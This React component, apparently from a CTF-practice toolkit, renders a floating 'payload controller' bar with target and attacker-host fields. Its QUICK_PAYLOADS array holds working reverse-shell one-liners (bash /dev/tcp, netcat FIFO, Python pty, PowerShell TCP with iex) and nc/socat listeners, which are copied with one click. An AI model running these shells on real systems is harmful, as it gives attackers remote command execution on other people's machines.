import React, { useState, useMemo } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { 
  Zap, 
  Copy, 
  Check, 
  ChevronUp, 
  ChevronDown, 
  Radio, 
  Terminal, 
  Crosshair, 
  ShieldAlert,
  Sliders,
  X
} from 'lucide-react';
import { useCtfStore } from '../../store/useCtfStore';
import { useShallow } from 'zustand/react/shallow';
import { playCyberSound, safeCopyToClipboard } from '../../utils/helpers';

interface QuickShell {
  name: string;
  category: 'linux' | 'windows' | 'listener';
  getCommand: (lhost: string, lport: string) => string;
}

const QUICK_PAYLOADS: QuickShell[] = [
  {
    name: 'Bash -i',
    category: 'linux',
    getCommand: (h, p) => `bash -i >& /dev/tcp/${h}/${p} 0>&1`,
  },
  {
    name: 'Netcat FIFO',
    category: 'linux',
    getCommand: (h, p) => `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${h} ${p} >/tmp/f`,
  },
  {
    name: 'Python3 PTY',
    category: 'linux',
    getCommand: (h, p) => `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${h}",${p}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'`,
  },
  {
    name: 'PowerShell Web',
    category: 'windows',
    getCommand: (h, p) => `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('${h}',${p});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`,
  },
  {
    name: 'RLWrap NC Listener',
    category: 'listener',
    getCommand: (_h, p) => `rlwrap nc -lvnp ${p}`,
  },
  {
    name: 'Socat TTY Listener',
    category: 'listener',
    getCommand: (_h, p) => `socat file:\`tty\`,raw,echo=0 tcp-listen:${p}`,
  },
];

export const FloatingPayloadBar: React.FC = () => {
  const { globalVars, setGlobalVars, activeTargetId, soundEnabled } = useCtfStore(
    useShallow((s) => ({
      globalVars: s.globalVars,
      setGlobalVars: s.setGlobalVars,
      activeTargetId: s.activeTargetId,
      soundEnabled: s.soundEnabled,
    }))
  );

  const activeMachine = useCtfStore(
    useShallow((s) => {
      if (!s.activeTargetId) return null;
      const m = s.machines.find((box) => box.id === s.activeTargetId);
      if (!m) return null;
      return { id: m.id, name: m.name, ip: m.ip };
    })
  );

  const [isExpanded, setIsExpanded] = useState(false);
  const [showShellDrawer, setShowShellDrawer] = useState(false);
  const [copiedKey, setCopiedKey] = useState<string | null>(null);

  const [showCopyMenu, setShowCopyMenu] = useState(false);
  const copyMenuRef = React.useRef<HTMLDivElement>(null);

  React.useEffect(() => {
    if (!showCopyMenu) return;
    const handleClickOutside = (e: MouseEvent) => {
      if (copyMenuRef.current && !copyMenuRef.current.contains(e.target as Node)) {
        setShowCopyMenu(false);
      }
    };
    document.addEventListener('mousedown', handleClickOutside);
    return () => document.removeEventListener('mousedown', handleClickOutside);
  }, [showCopyMenu]);

  const lhost = globalVars.lhost || '10.10.14.X';
  const lport = globalVars.lport || '4444';
  const targetIp = activeMachine?.ip || globalVars.targetIp || '10.10.10.X';
  const currentInterface = globalVars.interface || 'tun0';

  const allTacticalInfo = useMemo(() => {
    if (activeMachine) {
      return `${activeMachine.name} (${targetIp}) | LHOST: ${lhost}:${lport}`;
    }
    return `Target: ${targetIp} | LHOST: ${lhost}:${lport}`;
  }, [activeMachine, targetIp, lhost, lport]);

  const envExportString = useMemo(() => {
    return `export IP=${targetIp} LHOST=${lhost} LPORT=${lport}`;
  }, [targetIp, lhost, lport]);

  const copyWithFeedback = (key: string, text: string) => {
    safeCopyToClipboard(text);
    if (soundEnabled) playCyberSound('copy');
    setCopiedKey(key);
    setTimeout(() => {
      setCopiedKey((prev) => (prev === key ? null : prev));
    }, 1800);
  };

  const handleLhostChange = (val: string) => {
    setGlobalVars({ lhost: val.trim() });
  };

  const handleLportChange = (val: string) => {
    setGlobalVars({ lport: val.trim() });
  };

  const handleInterfaceToggle = () => {
    const nextIf = currentInterface === 'tun0' ? 'eth0' : currentInterface === 'eth0' ? 'ens33' : 'tun0';
    setGlobalVars({ interface: nextIf });
    if (soundEnabled) playCyberSound('click');
  };

  return (
    <aside aria-label="Tactical Payload Bar" className="fixed bottom-20 md:bottom-4 right-3 sm:right-4 z-40 font-mono select-none" style={{ contain: 'layout paint' }}>
      <AnimatePresence initial={false}>
        {!isExpanded ? (
          /* Minimized Tactical Chip */
          <motion.div
            key="minimized-chip"
            initial={{ opacity: 0, scale: 0.9, y: 10 }}
            animate={{ opacity: 1, scale: 1, y: 0 }}
            exit={{ opacity: 0, scale: 0.9, y: 8 }}
            className="relative flex items-center gap-2 p-1.5 px-3 rounded-full bg-white/95 dark:bg-slate-900/95 backdrop-blur-md border border-slate-200/90 dark:border-cyber-cyan/40 shadow-lg shadow-slate-300/40 dark:shadow-glow-cyan/20 text-slate-800 dark:text-slate-100 hover:border-cyan-500 dark:hover:border-cyber-cyan transition-all cursor-pointer group"
            onClick={() => setIsExpanded(true)}
          >
            {/* Quick Copy Menu Popover */}
            <AnimatePresence>
              {showCopyMenu && (
                <motion.div
                  ref={copyMenuRef}
                  initial={{ opacity: 0, y: 8, scale: 0.95 }}
                  animate={{ opacity: 1, y: 0, scale: 1 }}
                  exit={{ opacity: 0, y: 8, scale: 0.95 }}
                  transition={{ duration: 0.14 }}
                  className="absolute bottom-full mb-2 right-0 w-80 rounded-xl bg-white/95 dark:bg-slate-950/95 backdrop-blur-xl border border-slate-200 dark:border-cyber-cyan/40 shadow-2xl shadow-slate-400/30 dark:shadow-glow-cyan/20 p-2 z-50 space-y-1 text-xs"
                  onClick={(e) => e.stopPropagation()}
                >
                  <div className="flex items-center justify-between px-2 py-1 text-[10px] uppercase font-bold text-slate-500 dark:text-cyber-muted border-b border-slate-200 dark:border-slate-800">
                    <span className="flex items-center gap-1.5 text-cyan-600 dark:text-cyber-cyan">
                      <Copy className="w-3 h-3" /> Quick Copy All / Fields
                    </span>
                    <button
                      onClick={() => setShowCopyMenu(false)}
                      className="p-0.5 hover:text-slate-900 dark:hover:text-white transition-colors"
                      title="Close"
                    >
                      <X className="w-3 h-3" />
                    </button>
                  </div>

                  {/* Copy All */}
                  <button
                    onClick={() => {
                      copyWithFeedback('menu-all', allTacticalInfo);
                      setTimeout(() => setShowCopyMenu(false), 900);
                    }}
                    className="w-full flex items-center justify-between p-2 rounded-lg hover:bg-slate-100 dark:hover:bg-slate-900 text-left transition-colors group"
                  >
                    <div className="flex flex-col min-w-0 pr-2">
                      <span className="font-bold text-slate-900 dark:text-white group-hover:text-cyan-600 dark:group-hover:text-cyber-cyan flex items-center gap-1">
                        📋 Copy All Tactical Info
                      </span>
                      <span className="text-[10px] text-slate-500 dark:text-cyber-muted truncate font-mono">
                        {allTacticalInfo}
                      </span>
                    </div>
                    {copiedKey === 'menu-all' ? (
                      <Check className="w-4 h-4 text-emerald-500 shrink-0" />
                    ) : (
                      <Copy className="w-4 h-4 text-slate-400 group-hover:text-cyan-500 shrink-0" />
                    )}
                  </button>

                  {/* Target IP */}
                  <button
                    onClick={() => {
                      copyWithFeedback('menu-target', targetIp);
                      setTimeout(() => setShowCopyMenu(false), 900);
                    }}
                    className="w-full flex items-center justify-between p-1.5 px-2 rounded-lg hover:bg-slate-100 dark:hover:bg-slate-900 text-left transition-colors group"
                  >
                    <div className="flex items-center gap-2 min-w-0">
                      <Crosshair className="w-3.5 h-3.5 text-amber-500 shrink-0" />
                      <span className="font-medium text-slate-700 dark:text-slate-200 group-hover:text-cyan-600 dark:group-hover:text-cyber-cyan">
                        Target IP:
                      </span>
                      <span className="text-cyan-600 dark:text-cyber-cyan font-bold font-mono truncate">
                        {targetIp}
                      </span>
                    </div>
                    {copiedKey === 'menu-target' ? (
                      <Check className="w-3.5 h-3.5 text-emerald-500 shrink-0" />
                    ) : (
                      <Copy className="w-3.5 h-3.5 text-slate-400 group-hover:text-cyan-500 shrink-0" />
                    )}
                  </button>

                  {/* Machine Name */}
                  {activeMachine && (
                    <button
                      onClick={() => {
                        copyWithFeedback('menu-name', activeMachine.name);
                        setTimeout(() => setShowCopyMenu(false), 900);
                      }}
                      className="w-full flex items-center justify-between p-1.5 px-2 rounded-lg hover:bg-slate-100 dark:hover:bg-slate-900 text-left transition-colors group"
                    >
                      <div className="flex items-center gap-2 min-w-0">
                        <span className="text-[10px] px-1 rounded font-bold uppercase bg-slate-200 dark:bg-slate-800 text-slate-700 dark:text-slate-300">
                          NAME
                        </span>
                        <span className="text-slate-900 dark:text-white font-medium truncate">
                          {activeMachine.name}
                        </span>
                      </div>
                      {copiedKey === 'menu-name' ? (
                        <Check className="w-3.5 h-3.5 text-emerald-500 shrink-0" />
                      ) : (
                        <Copy className="w-3.5 h-3.5 text-slate-400 group-hover:text-cyan-500 shrink-0" />
                      )}
                    </button>
                  )}

                  {/* LHOST:LPORT */}
                  <button
                    onClick={() => {
                      copyWithFeedback('menu-lhost-port', `${lhost}:${lport}`);
                      setTimeout(() => setShowCopyMenu(false), 900);
                    }}
                    className="w-full flex items-center justify-between p-1.5 px-2 rounded-lg hover:bg-slate-100 dark:hover:bg-slate-900 text-left transition-colors group"
                  >
                    <div className="flex items-center gap-2 min-w-0">
                      <Zap className="w-3.5 h-3.5 text-cyan-600 dark:text-cyber-cyan shrink-0" />
                      <span className="font-medium text-slate-700 dark:text-slate-200 group-hover:text-cyan-600 dark:group-hover:text-cyber-cyan">
                        LHOST:PORT:
                      </span>
                      <span className="text-cyan-600 dark:text-cyber-cyan font-bold font-mono truncate">
                        {lhost}:{lport}
                      </span>
                    </div>
                    {copiedKey === 'menu-lhost-port' ? (
                      <Check className="w-3.5 h-3.5 text-emerald-500 shrink-0" />
                    ) : (
                      <Copy className="w-3.5 h-3.5 text-slate-400 group-hover:text-cyan-500 shrink-0" />
                    )}
                  </button>

                  {/* Shell Export */}
                  <button
                    onClick={() => {
                      copyWithFeedback('menu-env', envExportString);
                      setTimeout(() => setShowCopyMenu(false), 900);
                    }}
                    className="w-full flex items-center justify-between p-1.5 px-2 rounded-lg hover:bg-slate-100 dark:hover:bg-slate-900 text-left transition-colors group border-t border-slate-200 dark:border-slate-800/80 pt-2"
                  >
                    <div className="flex items-center gap-2 min-w-0">
                      <Terminal className="w-3.5 h-3.5 text-emerald-500 shrink-0" />
                      <span className="text-[11px] font-mono text-emerald-600 dark:text-cyber-emerald truncate">
                        {envExportString}
                      </span>
                    </div>
                    {copiedKey === 'menu-env' ? (
                      <Check className="w-3.5 h-3.5 text-emerald-500 shrink-0" />
                    ) : (
                      <Copy className="w-3.5 h-3.5 text-slate-400 group-hover:text-cyan-500 shrink-0" />
                    )}
                  </button>
                </motion.div>
              )}
            </AnimatePresence>

            <div className="flex items-center gap-1.5 text-xs font-bold text-cyan-700 dark:text-cyber-cyan">
              <span className="w-2 h-2 rounded-full bg-emerald-500 dark:bg-cyber-emerald animate-pulse" />
              <Zap className="w-3.5 h-3.5 text-cyan-600 dark:text-cyber-cyan" />
              <span>{lhost}:{lport}</span>
            </div>

            {activeMachine && (
              <div className="hidden sm:flex items-center gap-1 text-[11px] text-slate-500 dark:text-cyber-muted pl-1.5 border-l border-slate-300 dark:border-slate-700">
                <Crosshair className="w-3 h-3 text-amber-500 dark:text-amber-400" />
                <span className="text-slate-900 dark:text-white font-medium">{activeMachine.name}</span>
                <span className="text-cyan-600 dark:text-cyber-cyan">({targetIp})</span>
              </div>
            )}

            <button
              onClick={(e) => {
                e.stopPropagation();
                setShowCopyMenu((prev) => !prev);
              }}
              title="Open Quick Copy Menu (Copy All, Target IP, LHOST)"
              aria-label="Open Quick Copy Menu"
              className="p-1 hover:bg-slate-100 dark:hover:bg-slate-800 rounded text-slate-500 dark:text-slate-300 hover:text-slate-900 dark:hover:text-white transition-colors ml-1"
            >
              {copiedKey?.startsWith('menu') || copiedKey === 'min-lhost' ? (
                <Check className="w-3.5 h-3.5 text-emerald-600 dark:text-cyber-emerald" />
              ) : (
                <Copy className="w-3.5 h-3.5" />
              )}
            </button>

            <ChevronUp className="w-3.5 h-3.5 text-slate-400 dark:text-cyber-muted group-hover:text-slate-800 dark:group-hover:text-white transition-colors" />
          </motion.div>
        ) : (
          /* Expanded Tactical HUD Bar */
          <motion.div
            key="expanded-bar"
            initial={{ opacity: 0, y: 15, scale: 0.96 }}
            animate={{ opacity: 1, y: 0, scale: 1 }}
            exit={{ opacity: 0, y: 15, scale: 0.96 }}
            transition={{ duration: 0.16 }}
            className="w-[calc(100vw-1.5rem)] sm:w-[480px] rounded-2xl bg-white/95 dark:bg-slate-950/95 backdrop-blur-xl border border-slate-200/90 dark:border-cyber-cyan/40 shadow-2xl shadow-slate-400/30 dark:shadow-cyber-cyan/10 overflow-hidden text-slate-800 dark:text-slate-100"
          >
            {/* HUD Header */}
            <div className="flex items-center justify-between px-3 py-2 bg-slate-50 dark:bg-slate-900/80 border-b border-slate-200 dark:border-cyber-cyan/20">
              <div className="flex items-center gap-2">
                <span className="w-2 h-2 rounded-full bg-emerald-500 dark:bg-cyber-emerald animate-pulse" />
                <span className="text-xs font-bold tracking-wider text-cyan-700 dark:text-cyber-cyan uppercase flex items-center gap-1">
                  <Terminal className="w-3.5 h-3.5" /> PAYLOAD CONTROLLER
                </span>
              </div>

              <div className="flex items-center gap-1.5">
                <button
                  onClick={() => copyWithFeedback('hud-copy-all', allTacticalInfo)}
                  title="Copy All Tactical Info"
                  className="text-[10px] px-2 py-0.5 rounded bg-cyan-50 hover:bg-cyan-100 dark:bg-cyber-cyan/15 dark:hover:bg-cyber-cyan/25 text-cyan-700 dark:text-cyber-cyan font-bold border border-cyan-300 dark:border-cyber-cyan/40 flex items-center gap-1 transition-colors"
                >
                  {copiedKey === 'hud-copy-all' ? (
                    <>
                      <Check className="w-2.5 h-2.5 text-emerald-600 dark:text-cyber-emerald" />
                      <span>Copied!</span>
                    </>
                  ) : (
                    <>
                      <Copy className="w-2.5 h-2.5" />
                      <span>Copy All</span>
                    </>
                  )}
                </button>
                <button
                  onClick={handleInterfaceToggle}
                  title="Toggle Network Interface"
                  className="text-[10px] px-2 py-0.5 rounded bg-slate-100 hover:bg-slate-200 dark:bg-slate-800 dark:hover:bg-slate-700 text-cyan-700 dark:text-cyber-cyan font-bold border border-slate-300 dark:border-cyber-cyan/30 flex items-center gap-1 transition-colors"
                >
                  <Radio className="w-2.5 h-2.5" />
                  {currentInterface}
                </button>
                <button
                  onClick={() => setIsExpanded(false)}
                  title="Minimize Bar"
                  className="p-1 hover:bg-slate-200 dark:hover:bg-slate-800 rounded text-slate-500 dark:text-cyber-muted hover:text-slate-900 dark:hover:text-white transition-colors"
                >
                  <ChevronDown className="w-4 h-4" />
                </button>
              </div>
            </div>

            {/* Main Interactive Controls */}
            <div className="p-3 space-y-2.5">
              <div className="grid grid-cols-12 gap-2">
                {/* LHOST Input */}
                <div className="col-span-7 space-y-1">
                  <div className="flex items-center justify-between text-[10px] text-slate-500 dark:text-cyber-muted font-bold tracking-wider uppercase">
                    <span>LHOST (Attacker)</span>
                    <button
                      onClick={() => copyWithFeedback('lhost', lhost)}
                      className="text-cyan-600 hover:text-cyan-800 dark:text-cyber-cyan dark:hover:underline flex items-center gap-0.5"
                    >
                      {copiedKey === 'lhost' ? <Check className="w-2.5 h-2.5 text-emerald-600 dark:text-cyber-emerald" /> : <Copy className="w-2.5 h-2.5" />}
                      {copiedKey === 'lhost' ? 'Copied' : 'Copy'}
                    </button>
                  </div>
                  <div className="relative">
                    <input
                      type="text"
                      value={lhost}
                      onChange={(e) => handleLhostChange(e.target.value)}
                      placeholder="10.10.14.X"
                      className="w-full bg-slate-50 dark:bg-slate-900 border border-slate-300 dark:border-slate-700 focus:border-cyan-500 dark:focus:border-cyber-cyan rounded-lg px-2.5 py-1 text-xs text-slate-900 dark:text-white font-mono outline-none transition-colors"
                    />
                  </div>
                </div>

                {/* LPORT Input */}
                <div className="col-span-5 space-y-1">
                  <div className="flex items-center justify-between text-[10px] text-slate-500 dark:text-cyber-muted font-bold tracking-wider uppercase">
                    <span>LPORT</span>
                    <button
                      onClick={() => copyWithFeedback('lport', lport)}
                      className="text-cyan-600 hover:text-cyan-800 dark:text-cyber-cyan dark:hover:underline flex items-center gap-0.5"
                    >
                      {copiedKey === 'lport' ? <Check className="w-2.5 h-2.5 text-emerald-600 dark:text-cyber-emerald" /> : <Copy className="w-2.5 h-2.5" />}
                      {copiedKey === 'lport' ? 'Copied' : 'Copy'}
                    </button>
                  </div>
                  <div className="relative">
                    <input
                      type="text"
                      maxLength={5}
                      value={lport}
                      onChange={(e) => handleLportChange(e.target.value)}
                      placeholder="4444"
                      className="w-full bg-slate-50 dark:bg-slate-900 border border-slate-300 dark:border-slate-700 focus:border-cyan-500 dark:focus:border-cyber-cyan rounded-lg px-2.5 py-1 text-xs text-cyan-600 dark:text-cyber-cyan font-bold font-mono outline-none transition-colors"
                    />
                  </div>
                </div>
              </div>

              {/* Active Target Banner */}
              <div className="flex items-center justify-between px-2.5 py-1.5 rounded-lg bg-slate-50 dark:bg-slate-900/60 border border-slate-200 dark:border-slate-800 text-xs">
                <div className="flex items-center gap-2 overflow-hidden">
                  <Crosshair className="w-3.5 h-3.5 text-amber-500 dark:text-amber-400 shrink-0" />
                  <span className="text-slate-500 dark:text-cyber-muted text-[11px]">Target:</span>
                  <span className="font-bold text-slate-900 dark:text-white truncate max-w-[140px]">
                    {activeMachine ? activeMachine.name : 'No Target Engaged'}
                  </span>
                  <span className="font-mono text-cyan-600 dark:text-cyber-cyan text-[11px] truncate">
                    ({targetIp})
                  </span>
                </div>

                <div className="flex items-center gap-1 shrink-0">
                  <button
                    onClick={() => copyWithFeedback('hud-env', envExportString)}
                    title={`Copy Shell Export: ${envExportString}`}
                    className="p-1 hover:bg-slate-200 dark:hover:bg-slate-800 rounded text-slate-500 dark:text-cyber-muted hover:text-emerald-600 dark:hover:text-cyber-emerald transition-colors"
                  >
                    {copiedKey === 'hud-env' ? (
                      <Check className="w-3.5 h-3.5 text-emerald-600 dark:text-cyber-emerald" />
                    ) : (
                      <Terminal className="w-3.5 h-3.5" />
                    )}
                  </button>
                  <button
                    onClick={() => copyWithFeedback('targetIp', targetIp)}
                    title="Copy Target IP"
                    className="p-1 hover:bg-slate-200 dark:hover:bg-slate-800 rounded text-slate-500 dark:text-cyber-muted hover:text-cyan-600 dark:hover:text-cyber-cyan transition-colors"
                  >
                    {copiedKey === 'targetIp' ? (
                      <Check className="w-3.5 h-3.5 text-emerald-600 dark:text-cyber-emerald" />
                    ) : (
                      <Copy className="w-3.5 h-3.5" />
                    )}
                  </button>
                </div>
              </div>

              {/* Quick RevShells Action Bar */}
              <div>
                <button
                  onClick={() => setShowShellDrawer(!showShellDrawer)}
                  className="w-full flex items-center justify-between px-2.5 py-1 rounded bg-slate-50 hover:bg-slate-100 dark:bg-slate-900/40 dark:hover:bg-slate-900 border border-slate-200 dark:border-slate-800 hover:border-cyan-500/40 dark:hover:border-cyber-cyan/40 text-[11px] text-cyan-700 dark:text-cyber-cyan font-semibold transition-all"
                >
                  <span className="flex items-center gap-1.5">
                    <Zap className="w-3 h-3" /> Quick 1-Click Reverse Shells
                  </span>
                  {showShellDrawer ? <ChevronUp className="w-3.5 h-3.5" /> : <ChevronDown className="w-3.5 h-3.5" />}
                </button>

                <AnimatePresence>
                  {showShellDrawer && (
                    <motion.div
                      initial={{ opacity: 0, y: -8 }}
                      animate={{ opacity: 1, y: 0 }}
                      exit={{ opacity: 0, y: -8 }}
                      transition={{ duration: 0.15, ease: 'easeOut' }}
                      className="mt-1.5 space-y-1 overflow-hidden will-change-transform"
                    >
                      {QUICK_PAYLOADS.map((shell) => {
                        const cmd = shell.getCommand(lhost, lport);
                        const isCopied = copiedKey === `shell-${shell.name}`;

                        return (
                          <div
                            key={shell.name}
                            onClick={() => copyWithFeedback(`shell-${shell.name}`, cmd)}
                            className="flex items-center justify-between p-1.5 px-2 rounded bg-slate-50 hover:bg-slate-100 dark:bg-slate-900/90 dark:hover:bg-slate-800 border border-slate-200 dark:border-slate-800/80 hover:border-cyan-500/50 dark:hover:border-cyber-cyan/50 cursor-pointer group transition-all"
                          >
                            <div className="flex items-center gap-2 min-w-0 pr-2">
                              <span className={`text-[9px] px-1 rounded font-bold uppercase ${
                                shell.category === 'linux' ? 'bg-blue-100 text-blue-800 border border-blue-200 dark:bg-blue-950 dark:text-blue-300 dark:border-blue-800' :
                                shell.category === 'windows' ? 'bg-amber-100 text-amber-800 border border-amber-200 dark:bg-amber-950 dark:text-amber-300 dark:border-amber-800' :
                                'bg-emerald-100 text-emerald-800 border border-emerald-200 dark:bg-emerald-950 dark:text-emerald-300 dark:border-emerald-800'
                              }`}>
                                {shell.category}
                              </span>
                              <span className="text-[11px] font-bold text-slate-800 dark:text-slate-200 group-hover:text-cyan-700 dark:group-hover:text-cyber-cyan transition-colors">
                                {shell.name}
                              </span>
                              <span className="text-[10px] text-slate-500 dark:text-slate-400 truncate max-w-[180px] sm:max-w-[240px]">
                                {cmd}
                              </span>
                            </div>

                            <button
                              title="Copy Payload"
                              className="p-1 text-slate-400 dark:text-cyber-muted hover:text-slate-700 dark:group-hover:text-white shrink-0"
                            >
                              {isCopied ? (
                                <Check className="w-3.5 h-3.5 text-emerald-600 dark:text-cyber-emerald" />
                              ) : (
                                <Copy className="w-3.5 h-3.5" />
                              )}
                            </button>
                          </div>
                        );
                      })}
                    </motion.div>
                  )}
                </AnimatePresence>
              </div>
            </div>
          </motion.div>
        )}
      </AnimatePresence>
    </aside>
  );
};
export default FloatingPayloadBar;
